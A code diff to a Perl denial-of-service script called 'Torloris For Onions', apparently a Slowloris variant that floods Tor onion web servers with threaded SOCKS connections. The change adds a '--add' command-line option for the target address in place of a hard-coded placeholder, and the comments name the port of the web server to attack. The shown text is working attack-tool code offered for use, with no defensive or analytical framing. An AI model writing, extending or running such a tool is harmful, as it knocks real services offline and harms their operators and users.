@@ -13,6 +13,7 @@ use strict;
 #Include the socket functions of PERL
 use IO::Socket;
 use IO::Socket::Socks;	
+use Getopt::Long qw(GetOptions);
 #Include threading package
 use threads;
 #Ignore sigs
@@ -50,8 +51,11 @@ coooCCO8\@88OO8O888Oo:::... ..  :cO8Oc. . .....  :.  .:ccCoooooccoooocccccooooCC
 Welcome to Torloris For Onions
 EOTEXT
 
+my $add;
+GetOptions('add=s' => \$add) or die "Usage: $0 --add address";
+
 # Server info and port info. 
-	my $server = shift || "somethingsomethingsome.onion"; # input a 22 char length Onion address 
+	my $server = shift || $add; # input a 22 char length Onion address 
 	my $protoport = "80"; #Port of web server to attack
 	my $sleeptimer; #A variable to hold a timer
 	my $threadcon = 50; #The amount of loops per thread/
